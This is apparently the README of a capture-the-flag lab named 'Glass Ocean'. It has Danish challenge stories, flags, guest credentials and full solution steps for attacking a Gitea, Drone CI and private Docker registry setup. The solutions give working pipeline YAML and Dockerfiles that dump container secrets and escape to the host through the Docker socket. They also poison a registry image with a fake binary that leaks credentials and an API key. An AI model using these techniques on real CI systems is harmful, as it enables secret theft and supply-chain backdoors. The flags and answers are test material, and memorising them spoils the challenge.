# Glass Ocean

DevOps tool based challenges with focus on docker breakout, cache poisoning and supply chain attack.

## Flag(s)

- `DDC{N0W_TH3_R4T2_4R3_JUMP1NG_2H1P2}`
- `DDC{TH3_CH1CK3N_H42_3SC4P3D_TH3_P3N}`
- `DDC{Y0U_2H0ULD_N0T_H4V3_TH12}`
- `DDC{H3Y_1_W42_U21NG_TH4T}`

## Domain Names
- `git.glassocean.hkn`
- `drone.glassocean.hkn`
- `registry.glassocean.hkn`
- `internalgit.glassocean.hkn`
- `internaldrone.glassocean.hkn`
- `internalrunner.glassocean.hkn`
- `internalnginxweb.glassocean.hkn`
- `internalregistry.glassocean.hkn`

# Descriptions

## Glass Ocean, Crystal Minnow - Bryde ind eller bryde ud?

Proposed difficulty: medium

Du har lige opdaget, at din halvfætter, som stadig skylder dig penge fra den der "fælles investering" i kryptovaluta i 2019, driver et DevOps-firma.  De bruger en Gitea-server til deres kode som du anonymt har formået at få en gæsteadgang til for “hjælpe”. 

Men nu er det på tide at få dine penge tilbage… på den kreative måde.

Hvis du bare kan stjæle en api nøgle eller to, så kan det være han bliver lidt mere... samarbejdsvillig. 

Du har ikke tænkt dig at skade noget – du vil bare have lidt forhandlingsmateriale. Familien er jo trods alt det vigtigste... men penge hjælper også.
    
Brugernavn: `guest3124`\
Adgangskode: `password`

[https://git.glassocean.hkn](https://git.glassocean.hkn)\
[https://drone.glassocean.hkn](https://drone.glassocean.hkn)

Du kan se hvor api nøglen er, men hvordan kommer du ind til dem?

## Glass Ocean, Host - Fisk ude af vandet!

Proposed difficulty: hard

Det med API-nøglen var en god start. Men nysgerrigheden rammer dig alligevel: hvad gemmer han egentlig på den server?

Du begynder at mistænke, at din halvfætter ikke bare har rod i økonomien, men også i sikkerheden. Og nu hvor du har foden indenfor, kunne du lige så godt se dig lidt omkring… uden for containeren.

Det er jo ikke hacking. Det er bare... grundig research.

[https://git.glassocean.hkn](https://git.glassocean.hkn)\
[https://drone.glassocean.hkn](https://drone.glassocean.hkn)


## Glass Ocean, Mackerel - Gift i vandet 1!

Proposed difficulty: hard

Du er ikke helt færdig endnu. Det viser sig, at din halvfætter også har sat en masse automatiske pipelines op med Drone CI – og de kører som et urværk. Desværre har du kun læseadgang. Men der lugter af noget interessant.

Et af systemerne bruger sin helt egen Docker registry, og det lader til, at der bliver brugt nogle interne credentials. Hvis du kan få fingrene i dem, kan du måske... *indsætte noget lidt mere fleksibelt* næste gang systemet bygger noget.

Ikke for at ødelægge noget. Bare et lille venligt påmindelse om, at gæld ikke forsvinder af sig selv. 

[https://git.glassocean.hkn](https://git.glassocean.hkn)\
[https://drone.glassocean.hkn](https://drone.glassocean.hkn)

## Glass Ocean, Barracuda - Gift i vandet 2!

Proposed difficulty: medium

Du har luret systemet. Din halvfætter har bygget en hel lille verden med automatiserede builds og interne værktøjer – og det hele kører på billeder fra deres egen Docker registry.

Det ville jo være en skam, hvis nogen udefra fik adgang til den registry. Ikke for at ødelægge noget – bare for at bidrage med lidt kode af egen konstruktion.

Du har allerede en idé om, hvordan du får adgang. Og når først din lille tilføjelse er blevet en del af hans pipelines, så har du endelig noget håndgribeligt at sende med en venlig, men bestemt rykker.

Familien, du ved.

[https://git.glassocean.hkn](https://git.glassocean.hkn)\
[https://drone.glassocean.hkn](https://drone.glassocean.hkn)

## Proposed difficulty:

medium-hard

## Prerequisites & Outcome

### Prerequisites

- Basic knowledge about glassocean or CI tool
- Basic Git knowledge
- Basic knowledge
- Some docker knowledge

### Outcome

- Gain some experience with CI tools
- Learn some flaws with simple pipeline secret managers
- Learn some vulnerabilities with misconfiguration of DevOps tools
- Learn how to use the docker.socket to break out of a docker container, and how much you can do with it
- Learn about supply chain attacks and backdoors in code projects

## Solution(s)

## Glass Ocean del 1

When the CTF has fully started (may take a few minutes due to the drone runner using a VM) got the git.glassocean.hkn site and log in using the given credentials.
It is easy to just fork the Mackerel project to use as a base.
In the forked project, and change the following files:

.docker.yml :
```yml
kind: pipeline
type: docker
name: new-pipeline

steps:
  - name: build
    image: registry.glassocean.hkn/docker:1
    commands:
      - docker exec crystal-minnow printenv
```

Commit this change, and go to the drone site with the same user logging and go to the new repos pipeline. The flag should be printed to the execution logs. 

## Glass Ocean del 2
Using the same forked project, or another one, change the following files:

.docker.yml :
```yml
kind: pipeline
type: docker
name: new-pipeline

steps:
  - name: build
    image: registry.glassocean.hkn/docker:1
    commands:
      - docker run -v /flag.txt:/flag.txt --entrypoint cat ubuntu:20.04 /flag.txt
```
Commit this change, and go to the drone site with the same user logging and go to the new repos pipeline. The flag should be printed to the execution logs. 


## Glass Ocean del 3
Using the same forked project, or another one, change the following files:

.docker.yml :
```yml
kind: pipeline
type: docker
name: new-pipeline

steps:
  - name: build
    image: registry.glassocean.hkn/docker:2
    commands:
      - docker build -t registry.glassocean.hkn/docker:1 .
```

Dockerfile :
```dockerfile
FROM ubuntu:20.04

# Make malicious docker command
RUN echo "echo \$USERNAME : \$PASSWORD | base64" > /usr/local/bin/docker
RUN chmod +x /usr/local/bin/docker
```

Commit the changes to trigger a pipeline build. Then go to the original Mackerel pipeline and wain for a cron job to trigger. Then the flag / credentials should be printed to the execution log in base64.

## Glass Ocean del 4

Using the same forked project, or another one, change the following files:

.docker.yml :
```yml
kind: pipeline
type: docker
name: new-pipeline

steps:
  - name: build
    image: registry.glassocean.hkn/docker:2
    commands:
      - docker login https://registry.glassocean.hkn -u {found_username} -p {found_password}
      - docker build -t registry.glassocean.hkn/mackerel:latest .
      - docker push registry.glassocean.hkn/mackerel:latest
```
Insert the credentials found in the last task

Dockerfile :
```dockerfile
FROM ubuntu:20.04

# Make malicious docker command
RUN echo "echo \$API_KEY | base64" > /usr/local/bin/python
RUN chmod +x /usr/local/bin/python
```

Commit the changes to trigger a pipeline build. Then go to the Barracuda pipeline and wain for a cron job to trigger. Then the flag should be printed to the execution log in base64.

## How to run locally

This project was developped with linux in mind, so it might not work well for other OS.

You need docker installed on a linux computer.

- Open the terminal and go to the <path-to-project>/challenge/ folder.
- `docker compose build`
- `docker compose up -d`
- `docker network inspect bridge | grep Gateway`
- take the address found by the line above and add the following to you /etc/hosts file (please swap <address> for the acutal address): 
```
<address>       git.glassocean.hkn
<address>       drone.glassocean.hkn
<address>       registry.glassocean.hkn
<address>       internalgit.glassocean.hkn
<address>       internaldrone.glassocean.hkn
<address>       internalrunner.glassocean.hkn
<address>       internalnginxweb.glassocean.hkn
<address>       internalregistry.glassocean.hkn
```
- got to git.glassocean.hkn and drone.glassocean.hkn in you browser. 
- You should be able to see both a Gitea server and a Drone CI server
- Log in to the servers with username = guest3124, password = password
- Now you should be ready to solve the challenges
- Please note that I have had some trouble getting the VM in the runner docker container to work. It does not work on all systems, but it seems to work well on Haaukins servers.
